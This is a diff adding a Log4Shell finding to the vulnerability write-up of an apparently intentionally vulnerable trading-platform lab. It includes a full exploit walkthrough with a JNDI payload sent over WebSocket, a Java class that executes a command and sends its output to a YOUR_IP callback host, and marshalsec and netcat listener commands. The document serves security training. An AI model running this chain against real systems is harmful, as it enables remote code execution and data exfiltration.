@@ -182,3 +182,100 @@ curl -X POST http://localhost:8085/api/debug/execute \
 | File | `DashboardPage.js:352,356` |
 
 **Description:** Symbol names in the market prices table use `dangerouslySetInnerHTML` for rendering. If a symbol name contains HTML/JavaScript, it executes in every user's browser viewing the dashboard.
+
+---
+
+### INJ-11: Log4Shell (CVE-2021-44228) via WebSocket
+| Field | Value |
+|-------|-------|
+| Severity | Critical (CVSS 10.0) |
+| OWASP | A03: Injection + A06: Vulnerable Components |
+| CWE | CWE-917 (Expression Language Injection) |
+| CVE | CVE-2021-44228 |
+| Difficulty | Advanced |
+| Endpoints | WebSocket `/app/admin.haltTrading`, `/app/admin.adjustBalance`, `/app/trade.setAlert` |
+| Files | `AdminService.java:97`, `AdminService.java:73`, `AlertService.java:53` |
+
+**Description:** VulnTrade uses Log4j2 2.14.1, which is vulnerable to Log4Shell. User-controlled input (the `reason` field in halt/balance operations, the `symbol` field in alerts) flows directly into `logger.info()` calls. Log4j2 resolves `${jndi:ldap://...}` lookups in log messages, causing JNDI injection and Remote Code Execution.
+
+**Why this is realistic:** Trading platforms log everything for compliance (MiFID II, SOX, SEC Rule 613). The "reason" field for admin operations and trade metadata are natural log targets. Log4Shell in financial services was one of the most impactful real-world exploits of the vulnerability.
+
+**Attack vectors (all via WebSocket STOMP):**
+
+| Vector | STOMP Destination | Payload Field | Log Location |
+|--------|-------------------|---------------|-------------|
+| Halt Trading | `/app/admin.haltTrading` | `reason` | `AdminService.java:97` |
+| Balance Adjustment | `/app/admin.adjustBalance` | `reason` | `AdminService.java:73` |
+| Price Alert | `/app/trade.setAlert` | `symbol` | `AlertService.java:53` |
+| Login (username) | `POST /api/auth/login` | `username` | `AuthController.java` |
+
+**How to exploit (full walkthrough):**
+
+**Step 1: Set up the attacker infrastructure**
+```bash
+# Terminal 1: Start marshalsec LDAP redirect server
+# (redirects JNDI lookup to your HTTP server)
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
+  marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8888/#Exploit"
+
+# Terminal 2: Start HTTP server hosting the exploit class
+python3 -m http.server 8888
+```
+
+**Step 2: Create the exploit class**
+```java
+// Exploit.java — reads the Log4Shell flag
+import java.io.*;
+public class Exploit {
+  static {
+    try {
+      Process p = Runtime.getRuntime().exec("cat /opt/flags/flag_log4shell.txt");
+      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+      String line;
+      while ((line = br.readLine()) != null) {
+        // Exfiltrate via DNS, HTTP callback, or write to a shared location
+        new java.net.URL("http://YOUR_IP:9999/" + line).openStream();
+      }
+    } catch (Exception e) { e.printStackTrace(); }
+  }
+}
+```
+```bash
+javac Exploit.java  # Compile with Java 11 to match target
+```
+
+**Step 3: Trigger Log4Shell via WebSocket**
+```javascript
+// In browser console (already authenticated, WS connected):
+sendMessage('/app/admin.haltTrading', {
+  symbol: 'AAPL',
+  reason: '${jndi:ldap://YOUR_IP:1389/Exploit}'
+});
+```
+
+**Step 4: Receive the flag**
+```bash
+# Terminal 3: Listen for the callback
+nc -lvp 9999
+# Receives: GET /FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm} HTTP/1.1
+```
+
+**Alternative: simpler detection test (no full RCE)**
+```javascript
+// Test if Log4Shell fires by watching backend logs for JNDI connection attempt
+sendMessage('/app/admin.haltTrading', {
+  symbol: 'AAPL',
+  reason: '${jndi:ldap://127.0.0.1:1389/test}'
+});
+// Check: docker logs vulntrade-backend | grep -i "jndi"
+```
+
+**Flag:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` (in `/opt/flags/flag_log4shell.txt`)
+
+**What you learn:**
+- Log4Shell is not limited to HTTP headers (User-Agent) — any user-controlled data that reaches a Log4j2 logger call is exploitable
+- WebSocket/STOMP is an overlooked attack surface for Log4Shell
+- Financial platforms log extensively for compliance — creating a massive Log4Shell attack surface
+- WAFs cannot inspect STOMP frames, making WebSocket Log4Shell especially dangerous
+
+**Remediation:** Upgrade to Log4j2 >= 2.17.1, or set `log4j2.formatMsgNoLookups=true`, or remove `JndiLookup.class` from the classpath.
